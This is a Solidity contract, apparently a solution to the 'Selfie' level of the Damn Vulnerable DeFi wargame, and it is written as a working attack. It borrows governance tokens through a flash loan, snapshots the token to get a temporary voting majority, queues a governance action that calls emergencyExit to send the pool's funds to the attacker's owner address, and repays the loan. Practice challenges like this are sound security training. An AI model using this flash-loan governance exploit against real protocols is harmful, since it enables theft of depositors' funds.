// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
// import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title StealFromSelfie
 * @author Louis Law
 */
contract StealFromSelfie is IERC3156FlashBorrower {
    address public immutable owner;
    SelfiePool public immutable loanPool;
    DamnValuableTokenSnapshot public immutable ltoken;
    SimpleGovernance public immutable governance;
    uint256 public testint;
    uint256 private actionId;

    // RewardToken private rewardToken;
    // AccountingToken private accountingToken;

    constructor(SelfiePool _loanPool) {
        owner = msg.sender;
        loanPool = _loanPool;
        ltoken = DamnValuableTokenSnapshot(address(_loanPool.token()));
        governance = _loanPool.governance();
        testint = 100;
    }

    function executeAction() public {
        require(msg.sender == owner);
        governance.executeAction(actionId);
    }

    function executeFlashLoan(uint256 _amount, bytes calldata _data) public {
        require(_amount > 0);
        console.log("executeFlashLoan", uint64(block.timestamp));
        loanPool.flashLoan(this, address(ltoken), _amount, _data);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        console.log("onFlashLoan - start");
        require(token == address(ltoken), "unknown token");
        require(msg.sender == address(loanPool), "unknown pool");
        require(initiator == address(this), "loan not init by this contract");

        ltoken.snapshot();
        console.log(ltoken.getBalanceAtLastSnapshot(address(this)));
        console.log(ltoken.getTotalSupplyAtLastSnapshot());

        actionId = governance.queueAction(
            msg.sender,
            0,
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );

        uint256 totalAmount = amount + fee;
        ltoken.approve(msg.sender, totalAmount);
        console.log("onFlashLoan - approved");

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
